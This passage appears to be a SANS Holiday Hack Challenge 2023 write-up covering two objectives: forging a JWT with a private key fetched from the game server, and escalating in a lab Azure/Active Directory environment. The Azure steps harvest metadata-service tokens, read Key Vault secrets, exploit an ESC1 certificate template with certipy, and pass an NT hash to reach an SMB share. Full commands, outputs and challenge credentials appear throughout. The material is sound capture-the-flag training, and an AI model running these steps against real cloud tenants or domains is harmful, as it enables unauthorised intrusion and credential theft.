```
{music} {music} {music} 88323 88323 88323 {gong} {gong} {gong} {gong} {gong} {gong} 12249 12249 16009 16009 12249 12249 16009 16009 {gong} {gong} {gong} {gong} {gong} {gong} {music} {music} {music}
```

Clicking on the SDR and the right signal as radioDecoder:

![image](https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/captainscoms-1.png)

Now I have the radioUser, radioMonitor and radioDecoder tokens, and I have the public key used to verify those tokens. I need to gain access to the private key so I can create my own radioAdministrator token.

I believe after looking at the Captain's journal that the administrator role name is 'GeeseIslandsSuperChiefCommunicationsOfficer', and I know the folder for the private key is TH3CAPSPR1V4T3F0LD3R.

Since the public key is named capsPubKey.key, I suspect the private key is named capsPrivKey.key.

I verify this by attempting another GET request to that location, this time using the **radioDecoder** token obtained earlier:

```powershell
#access token for radioDecoder obtained earlier
$accessToken = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvRGVjb2RlciJ9.cnNu6EjIDBrq8PbMlQNF7GzTqtOOLO0Q2zAKBRuza9bHMZGFx0pOmeCy2Ltv7NUPv1yT9NZ-WapQ1-GNcw011Ssbxz0yQO3Mh2Tt3rS65dmb5cmYIZc0pol-imtclWh5s1OTGUtqSjbeeZ2QAMUFx3Ad93gR20pKpjmoeG_Iec4JHLTJVEksogowOouGyDxNAagIICSpe61F3MY1qTibOLSbq3UVfiIJS4XvGJwqbYfLdbhc-FvHWBUbHhAzIgTIyx6kfONOH9JBo2RRQKvN-0K37aJRTqbq99mS4P9PEVs0-YIIufUxJGIW0TdMNuVO3or6bIeVH6CjexIl14w6fg'

$headers = @{
"Authorization" = "Bearer $accessToken"
"Content-Type" = "application/json"
}

$uri = "https://captainscomms.com/jwtDefault/keys/TH3CAPSPR1V4T3F0LD3R/capsPrivKey.key"
$result = Invoke-WebRequest -Uri $uri -Headers $headers
$content = $result.content
Write-Output $content
```

```
GET /jwtDefault/keys/TH3CAPSPR1V4T3F0LD3R/capsPrivKey.key HTTP/2

Output:
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCwlm4slUHgR+1Q
5A3UC7BXMnKvUxrjEWjoSwTOuSmudBx2DDPaIwzvogSIfwWWApkbVTRFTg3ey4jb
g0mxvnAnfbshhcC44sEvMg3rmdCEn3AE9HtZ3gSijbAk/abYcrCRblhp2PpPZiDB
kuah3eqfomWE3TcM6TVuI24sPJZqj4w+aDZFzENHY9Gd8Fqu3PDQc8HXILZKnfd4
MaSkhdpzH+UZUcVXETWm1c/5qw4DMrXAR7PIOPJTFlwwyZXRWJvN5dvGxdi9XeSd
JyvZZg6pnmyxrhFqH2xaebQIobrfz+VUP2TBu9w7aUyVR5Onu/A5NcQbJp2kHRay
4gq48fq5AgMBAAECggEATlcmYJQE6i2uvFS4R8q5vC1u0JYzVupJ2sgxRU7DDZiI
adyHAm7LVeJQVYfYoBDeANC/hEGZCK7OM+heQMMGOZbfdoNCmSNL5ha0M0IFTlj3
VtNph9hlwQHP09FN/DeBWruT8L1oauIZhRcZR1VOuexPUm7bddheMlL4lRp59qKj
9k1hUQ3R3qAYST2EnqpEk1NV3TirnhIcAod53aAzcAqg/VruoPhdwmSv/xrfDS9R
DCxOzplHbVQ7sxZSt6URO/El6BrkvVvJEqECMUdON4agNEK5IYAFuIbETFNSu1TP
/dMvnR1fpM0lPOXeUKPNFveGKCc7B4IF2aDQ/CvD+wKBgQDpJjHSbtABNaJqVJ3N
/pMROk+UkTbSW69CgiH03TNJ9RflVMphwNfFJqwcWUwIEsBpe+Wa3xE0ZatecEM9
4PevvXGujmfskst/PuCuDwHnQ5OkRwaGIkujmBaNFmpkF+51v6LNdnt8UPGrkovD
onQIEjmvS1b53eUhDI91eysPKwKBgQDB5RVaS7huAJGJOgMpKzu54N6uljSwoisz
YJRY+5V0h65PucmZHPHe4/+cSUuuhMWOPinr+tbZtwYaiX04CNK1s8u4qqcX2ZRD
YuEv+WNDv2e1XjoWCTxfP71EorywkEyCnZq5kax3cPOqBs4UvSmsR9JiYKdeXfaC
VGiUyJgLqwKBgQDL+VZtO/VOmZXWYOEOb0JLODCXUdQchYn3LdJ3X26XrY2SXXQR
wZ0EJqk8xAL4rS8ZGgPuUmnC5Y/ft2eco00OuzbR+FSDbIoMcP4wSYDoyv5IIrta
bnauUUipdorttuIwsc/E4Xt3b3l/GV6dcWsCBK/i5I7bW34yQ8LejTtGsQKBgAmx
NdwJpPJ6vMurRrUsIBQulXMMtx2NPbOXxFKeYN4uWhxKITWyKLUHmKNrVokmwelW
Wiodo9fGOlvhO40tg7rpfemBPlEG405rBu6q/LdKPhjm2Oh5Fbd9LCzeJah9zhVJ
Y46bJY/i6Ys6Q9rticO+41lfk344HDZvmbq2PEN5AoGBANrYUVhKdTY0OmxLOrBb
kk8qpMhJycpmLFwymvFf0j3dWzwo8cY/+2zCFEtv6t1r7b8bjz/NYrwS0GvEc6Bj
xVa9JIGLTKZt+VRYMP1V+uJEmgSnwUFKrXPrAsyRaMcq0HAvQOMICX4ZvGyzWhut
UdQXV73mNwnYl0RQmBnDOl+i
-----END PRIVATE KEY-----
```

I now have the **key** to the kingdom! Next, I need to sign my own crafted JWT with the obtained private key.

Using Burp Suite, I modfify the payload in the JWT to the following:

```
{
    "iss": "HHC 2023 Captain's Comms",
    "iat": 1699485795.3403327,
    "exp": 1809937395.3403327,
    "aud": "Holiday Hack 2023",
    "role": "GeeseIslandsSuperChiefCommunicationsOfficer"
}
```

I then use the private key from above to sign the new token again using Burp Suite.

**GeeseIslandsSuperChiefCommunicationsOfficer** token:

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6IkdlZXNlSXNsYW5kc1N1cGVyQ2hpZWZDb21tdW5pY2F0aW9uc09mZmljZXIifQ.N-8MdT6yPFge7zERpm4VdLdVLMyYcY_Wza1TADoGKK5_85Y5ua59z2Ke0TTyQPa14Z7_Su5CpHZMoxThIEHUWqMzZ8MceUmNGzzIsML7iFQElSsLmBMytHcm9-qzL0Bqb5MeqoHZYTxN0vYG7WaGihYDTB7OxkoO_r4uPSQC8swFJjfazecCqIvl4T5i08p5Ur180GxgEaB-o4fpg_OgReD91ThJXPt7wZd9xMoQjSuPqTPiYrP5o-aaQMcNhSkMix_RX1UGrU-2sBlL01FxI7SjxPYu4eQbACvuK6G2wyuvaQIclGB2Qh3P7rAOTpksZSex9RjtKOiLMCafTyfFng
```

Now, I simply paste the new token into the value of my justWatchThisRole cookie in any browser and can now use the radio.

![image](https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/captainscoms-2.png)

So, now the next challenge is to solve the Go-Date and Go-Time.  I have the Frequency from the fax decoder on the SDR - **10426 Hz**.  The only thing I haven't solved yet is the numbers station decoder, so that's likely what contains the message about time and date. Looking back at it again, it is:

```
{music} {music} {music} 88323 88323 88323 {gong} {gong} {gong} {gong} {gong} {gong} 12249 12249 16009 16009 12249 12249 16009 16009 {gong} {gong} {gong} {gong} {gong} {gong} {music} {music} {music}
```

Reviewing the [Lincolnshire Poacher](https://www.numbers-stations.com/english/e03-the-lincolnshire-poacher/) from "Just Watch This Appendix A - Decoder Index", I found this interesting:

"After the music played the female voiced machine would identify who the message was for with a 5 digit call up. The message was announced by 3 chimes and the voice would read 200 message groups."

Also, to refresh my memory, I talked to Chimney Scissorsticks again and he states a couple different ways "Remember, the captain's abbreviations are your guiding light through this mystery!"

Thinking about this more, and looking at the cryptic message above - it appears to be a date and a time followed by a 9. Remembering that one of the elves told me to try send a signal out four hours earlier, I put 1224 for the date and 1600-400 = 1200 for the time.

Mission accomplished!

![image](https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/captainscoms-3.png)

### Resources

[Lincolnshire Poacher](https://www.numbers-stations.com/english/e03-the-lincolnshire-poacher/)

---

<!-- report-keep -->

## active-directory <img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/>

<!-- report-keep -->

### Objective

Go to Steampunk Island and help Ribb Bonbowford audit the Azure AD environment. What's the name of the secret file in the inaccessible folder on the FileShare?

<!-- report-keep -->

### Useful AI Prompts

- How can I get a token for Azure API from an Azure Linux virtual machine?
- Give me a short tutorial on using impacket

### Approach

To gain an understanding of the AD environment, I'll use the Azure Linux machine to interact with the [Azure Instance Metadata Service API](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service?tabs=linux) to get the and then use that token in PowerShell to interact with the API.

```console
curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq
```

What's returned is a json object containing several properties for the environment, but notably I will use the Subscription ID and Resource Group ID.

This now allows me to begin additional api calls now that I know the Subscription and Resource Group I have.  In order to hit standard APIs, I will need to generate a token.  To do so, I can actually get a token from the same endpoint in the Azure Instance Metadata Service because this machine is authenticated to the Azure service:

```console
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s
```

This will return a json object with the access token:

```json
{"access_token":"eyJ0eXAi...","client_id":"b84e06d3-aba1-4bcc-9626-2e0d76cba2ce","expires_in":"85901","expires_on":"1702429034","ext_expires_in":"86399","not_before":"1702342334","resource":"https://management.azure.com/","token_type":"Bearer"}
```

Now that I have a token, I can go to any machine and interact with the API using that token for the subscription that hosts the Azure Linux VM. For me, this is easiest in PowerShell.

```powershell
$accessToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDIzNDUwNDgsIm5iZiI6MTcwMjM0NTA0OCwiZXhwIjoxNzAyNDMxNzQ4LCJhaW8iOiJFMlZnWUlneTR1cTBkUTVXL2ZKNmhWYjNrMU45QUE9PSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiJOSHBIUUIwUk1FU21fU1lDMG1vZEFBIiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.Hh319ysX0csHSJput76alAa3uKjlkaStQHaQbo8-KDfS60QNZXrtqreIc51ys0RlgF-SUKVB6YCwwxDeQbpcSeX6Q1eTq5fxsvkL9CuIM71Cm_q5dQG_RFv7hkW0PQqRLlydxM3Q5wasvFmt-9Vvw-2glyxAFGJ21F9d-FhNUXhBKWFcmlHRNYlxQZg_02v8TF9-wzBIndK6RN_fQVG1ynm4T23KKpgqxfjkgvLo1uSRZeLRhiI5OY6lE77W6hviH9PkGA3GrNj9WXlBEdBC1zXTch8__j7_D9ddMsD5jUYx-10HV5vcJMNvierj5o_JKtpwA9PyFqCodYfBxALOBA'

$headers = @{
"Authorization" = "Bearer $accessToken"
"Content-Type" = "application/json"
}

$uri = "https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resources?api-version=2021-04-01"

$result = Invoke-WebRequest -Uri $uri -Headers $headers
$content = $result.content | ConvertFrom-Json
Write-Output $content.value

## found some vaults so find what I can get from them
$vaults = @(
    "northpole-it-kv"
    "northpole-ssh-certs-kv"
    )

$types = @(
    'keys'
    'secrets'
    'certificates'
    'storage'
    )

$uriPrefix = "https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers"

$content = @()
$secretUris = @()

foreach ($vault in $vaults) {
    foreach ($type in $types) {
        $uri = "$uriPrefix/Microsoft.KeyVault/vaults/$($vault)/$($type)?api-version=2022-07-01"
        try {
            $result = Invoke-WebRequest -Uri $uri -Headers $headers
            Write-Output "[Success] Access to $vault $type" 
            $content += $result.content | ConvertFrom-Json
            $secretUris += $content.value.properties.secretUriWithVersion
        }
        catch {
            Write-Output "[Failure] No access to $vault $type"
        }
    }
}

$secretUris = $secretUris | Sort-Object -Unique
Write-Output $secretUris

## I found some secrets so I'm going to attempt to gain access to them

#get key vault access token on linux:
## curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fvault.azure.net' -H Metadata:true

$keyVaultAccessToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL3ZhdWx0LmF6dXJlLm5ldCIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDIzNDk1NjgsIm5iZiI6MTcwMjM0OTU2OCwiZXhwIjoxNzAyNDM2MjY4LCJhaW8iOiJFMlZnWUxqNC90T3l6OWRlQ0szTmExQ1BuakN6Q1FBPSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsIm9pZCI6IjYwMGEzYmM4LTdlMmMtNDRlNS04YTI3LTE4YzNlYjk2MzA2MCIsInJoIjoiMC5BRkVBMm82amtBWkExVTJTVEd5bFhLekJUVG16cU0taWdocEhvOGtQd0w1NlFKUFFBQUEuIiwic3ViIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwidGlkIjoiOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkIiwidXRpIjoiRWdESk1vZzVmRUNlaXptNjZqb2lBQSIsInZlciI6IjEuMCIsInhtc19hel9yaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0LkNvbXB1dGUvdmlydHVhbE1hY2hpbmVzL3NzaC1zZXJ2ZXItdm0iLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0Lk1hbmFnZWRJZGVudGl0eS91c2VyQXNzaWduZWRJZGVudGl0aWVzL25vcnRocG9sZS1zc2gtc2VydmVyLWlkZW50aXR5In0.Zo7FCorGBiX6Mv3DhJhHGkCa1Oc4ElyMHq_93D9MtCHFMc8MrQwmdEIEtzqpqHjn4LSJPTbxWp7P90NmW20chxWMS9MTGzaHOjpUOnuDoRfESci_yERS5vh0Z1QtvXcfwggJ6li-ifPdiPM3ktTZyBo1gzvmQma3wc8a-3zfUzuYj551Ez6KMXN5ieRAeaFT6yUN1iPoXKFe9QcN2ucjke_X_RwQCIKjjfQKL46jmkm2UqxhWMqHRz1g81AWcROwDQi1nKxEwb4QNmx6k6CqR5agTAbfq89-bESx4xfdIiFbTU9M0qWd96IzmYjFhv-R_kV-aTuKd3u5JhEA9cwWEA'

$vaultHeaders = @{
"Authorization" = "Bearer $keyVaultAccessToken"
"Content-Type" = "application/json"
}

$content = @()

foreach ($secretUri in $secretUris) {
    try {
        $result = Invoke-WebRequest -Uri "$($secretUri)?api-version=7.4" -Headers $vaultHeaders
        $content += $result.content | ConvertFrom-Json
        Write-Output "[Success] Access to $secretUri"
    }
    catch {
        Write-Output "[Failure] No access to $secretUri"
    }
}

Write-Output $content.value
```

Found this in vault:

```powershell
Import-Module ActiveDirectory;
$UserName = "elfy";
$UserDomain = "northpole.local";
$UserUPN = "$UserName@$UserDomain"
$Password = ConvertTo-SecureString "J4`ufC49/J4766" -AsPlainText -Force;
$DCIP = "10.0.0.53";
New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname "" -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru
```

Spun my wheels on this for a bit, as I didn't really know now what my attack vector would be. But I decided to go back to the Linux terminal as alabaster and poke around. Something I didn't even notice when I first logged in as Alabaster (oh, and I missed the hint SMH) is there is a folder in his home directory called Impacket. There are multiple tools there so began trying them out.

```console
alabaster@ssh-server-vm:~$ pwd
/home/alabaster
alabaster@ssh-server-vm:~$ ls
alabaster_todo.md  impacket
alabaster@ssh-server-vm:~$ cd impacket
alabaster@ssh-server-vm:~/impacket$ ls
DumpNTLMInfo.py     atexec.py        exchanger.py       goldenPac.py      mimikatz.py       nmapAnswerMachine.py  raiseChild.py     rpcmap.py       smbexec.py    split.py            wmiquery.py
Get-GPPPassword.py  certipy          findDelegation.py  karmaSMB.py       mqtt_check.py     ntfs-read.py          rbcd.py           sambaPipe.py    smbpasswd.py  ticketConverter.py
GetADUsers.py       changepasswd.py  getArch.py         keylistattack.py  mssqlclient.py    ntlmrelayx.py         rdp_check.py      samrdump.py     smbrelayx.py  ticketer.py
GetNPUsers.py       dcomexec.py      getPac.py          kintercept.py     mssqlinstance.py  ping.py               reg.py            secretsdump.py  smbserver.py  tstool.py
GetUserSPNs.py      dpapi.py         getST.py           lookupsid.py      net.py            ping6.py              registry-read.py  services.py     sniff.py      wmiexec.py
addcomputer.py      esentutl.py      getTGT.py          machine_role.py   netview.py        psexec.py             rpcdump.py        smbclient.py    sniffer.py    wmipersist.py
alabaster@ssh-server-vm:~/impacket$ python3 GetADUsers.py -all northpole.local/elfy:'J4`ufC49/J4766' -dc-ip 10.0.0.53
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Querying 10.0.0.53 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon
--------------------  ------------------------------  -------------------  -------------------
alabaster                                             2023-12-12 02:03:10.009431  2023-12-12 15:15:02.771100
Guest                                                 <never>              <never>
krbtgt                                                2023-12-12 02:11:42.348154  <never>
elfy                                                  2023-12-12 02:13:45.650140  2023-12-12 15:52:41.904053
wombleycube                                           2023-12-12 02:13:45.759558  2023-12-12 16:46:44.924070
alabaster@ssh-server-vm:~/impacket$
```

Some additional recon:

```console
alabaster@ssh-server-vm:~/impacket$ python3 DumpNTLMInfo.py 10.0.0.53
Impacket v0.11.0 - Copyright 2023 Fortra

[+] SMBv1 Enabled   : False
[+] Prefered Dialect: SMB 3.0
[+] Server Security : SIGNING_ENABLED | SIGNING_REQUIRED
[+] Max Read Size   : 8.0 MB (8388608 bytes)
[+] Max Write Size  : 8.0 MB (8388608 bytes)
[+] Current Time    : 2023-12-12 17:17:49.242742+00:00
[+] Name            : npdc01
[+] Domain          : NORTHPOLE
[+] DNS Tree Name   : northpole.local
[+] DNS Domain Name : northpole.local
[+] DNS Host Name   : npdc01.northpole.local
[+] OS              : Windows NT 10.0 Build 20348
[+] Null Session    : False
alabaster@ssh-server-vm:~/impacket$
```

Looking for SMB shares:

```console
alabaster@ssh-server-vm:~/impacket$ python3 smbclient.py northpole.local/elfy:'J4`ufC49/J4766'@10.0.0.53 -dc-ip 10.0.0.53
Impacket v0.11.0 - Copyright 2023 Fortra

Type help for list of commands
## shares
ADMIN$
C$
D$
FileShare
IPC$
NETLOGON
SYSVOL
## use FileShare
## ls
drw-rw-rw-          0  Wed Dec 13 01:20:33 2023 .
drw-rw-rw-          0  Wed Dec 13 01:20:30 2023 ..
-rw-rw-rw-     701028  Wed Dec 13 01:20:33 2023 Cookies.pdf
-rw-rw-rw-    1521650  Wed Dec 13 01:20:33 2023 Cookies_Recipe.pdf
-rw-rw-rw-      54096  Wed Dec 13 01:20:33 2023 SignatureCookies.pdf
drw-rw-rw-          0  Wed Dec 13 01:20:33 2023 super_secret_research
-rw-rw-rw-        165  Wed Dec 13 01:20:33 2023 todo.txt
## cd super_secret_research
[-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
## 
```

There we are.  We have the share now, but can't access it with user elfy. On a side note, I have a lot of great cookie recipes after going through the trouble (and by trouble, I mean scp didn't work so convert the pdfs to base64 and copy the large amount of text then convert back to pdf on my machine) of transfering those pdfs thinking they may contain something useful. That was a rabbit hole. Knowing this is all about AD CS, I look a bit into the impacket tool [Github:Certipy](https://github.com/ly4k/Certipy). First, I use the tool to check the for templates using the AD username and password found earlier:

```console
alabaster@ssh-server-vm:~/impacket$certipy find -u elfy@northpole.local -p 'J4`ufC49/J4766' -dc-ip 10.0.0.53
```

This outputs some files, and looking at the xxxx_Certipy.txt file I see there is one misconvigured certificate template vulnerable to the [ESC1 vulnerability](https://posts.specterops.io/certified-pre-owned-d95910965cd2)

```
  0
    Template Name                       : NorthPoleUsers
    Display Name                        : NorthPoleUsers
    Certificate Authorities             : northpole-npdc01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : NORTHPOLE.LOCAL\Domain Admins
                                          NORTHPOLE.LOCAL\Domain Users
                                          NORTHPOLE.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : NORTHPOLE.LOCAL\Enterprise Admins
        Write Owner Principals          : NORTHPOLE.LOCAL\Domain Admins
                                          NORTHPOLE.LOCAL\Enterprise Admins
        Write Dacl Principals           : NORTHPOLE.LOCAL\Domain Admins
                                          NORTHPOLE.LOCAL\Enterprise Admins
        Write Property Principals       : NORTHPOLE.LOCAL\Domain Admins
                                          NORTHPOLE.LOCAL\Enterprise Admins
    [!] Vulnerabilities
      ESC1                              : 'NORTHPOLE.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
```

To exploit this vulnerability, I first request a certificate using that template as Domain User elfy but requesting SAN as wombleycube@<nolink>northpole.local:

```console
alabaster@ssh-server-vm:~/impacket$ certipy req -username elfy@northpole.local -password 'J4`ufC49/J4766' -ca northpole-npdc01-CA -target 10.0.0.53 -template NorthPoleUsers -upn wombleycube@northpole.local -ns 10.0.0.53 -dns npdc01.northpole.local
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 100
[*] Got certificate with multiple identifications
    UPN: 'wombleycube@northpole.local'
    DNS Host Name: 'npdc01.northpole.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'wombleycube_npdc01.pfx'
alabaster@ssh-server-vm:~/impacket$
```

Next, I attempt to get a hash I can use to access the fileshare:

```console
alabaster@ssh-server-vm:~/impacket$ certipy auth -pfx wombleycube_npdc01.pfx -dc-ip 10.0.0.53
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'wombleycube@northpole.local'
    [1] DNS Host Name: 'npdc01.northpole.local'
> 0
[*] Using principal: wombleycube@northpole.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'wombleycube.ccache'
[*] Trying to retrieve NT hash for 'wombleycube'
[*] Got hash for 'wombleycube@northpole.local': aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23
alabaster@ssh-server-vm:~/impacket$ 
```

YES! I now have a hash I can use.  Let's put it to work going back to the SMB share:

```console
alabaster@ssh-server-vm:~/impacket$ python3 smbclient.py northpole.local/wombleycube@10.0.0.53 -hashes aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23 -dc-ip 10.0.0.53
Impacket v0.11.0 - Copyright 2023 Fortra

Type help for list of commands
## shares
ADMIN$
C$
D$
FileShare
IPC$
NETLOGON
SYSVOL
## use FileShare
## ls
drw-rw-rw-          0  Wed Dec 13 01:20:33 2023 .
drw-rw-rw-          0  Wed Dec 13 01:20:30 2023 ..
-rw-rw-rw-     701028  Wed Dec 13 01:20:33 2023 Cookies.pdf
-rw-rw-rw-    1521650  Wed Dec 13 01:20:33 2023 Cookies_Recipe.pdf
-rw-rw-rw-      54096  Wed Dec 13 01:20:33 2023 SignatureCookies.pdf
drw-rw-rw-          0  Wed Dec 13 01:20:33 2023 super_secret_research
-rw-rw-rw-        165  Wed Dec 13 01:20:33 2023 todo.txt
## cd super_secret_research
## ls
drw-rw-rw-          0  Wed Dec 13 01:20:33 2023 .
drw-rw-rw-          0  Wed Dec 13 01:20:33 2023 ..
-rw-rw-rw-        231  Wed Dec 13 01:20:33 2023 InstructionsForEnteringSatelliteGroundStation.txt
```

WIN! I now have my secret file name we need to enter into the objective to complete the challenge: InstructionsForEnteringSatelliteGroundStation.txt

But, why stop there?  What's in the secret file, potentially something useful??

```
## cat InstructionsForEnteringSatelliteGroundStation.txt
Note to self:

To enter the Satellite Ground Station (SGS), say the following into the speaker:

And he whispered, 'Now I shall be out of sight;
So through the valley and over the height.'
And he'll silently take his way.


## 
```

Well, that IS useful!

### Resources

[AD CS Exploit Background](https://posts.specterops.io/certified-pre-owned-d95910965cd2)

[Video explaining exploit](https://www.youtube.com/watch?v=HBRCI5O35R8)

[Github:Impacket](https://github.com/fortra/impacket)

[Github:Certipy](https://github.com/ly4k/Certipy)

[Github:Certipy for Windows](https://github.com/GhostPack/Certify)

[Azure Instance Metadata Service API](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service?tabs=linux)

---

<!-- report-keep -->

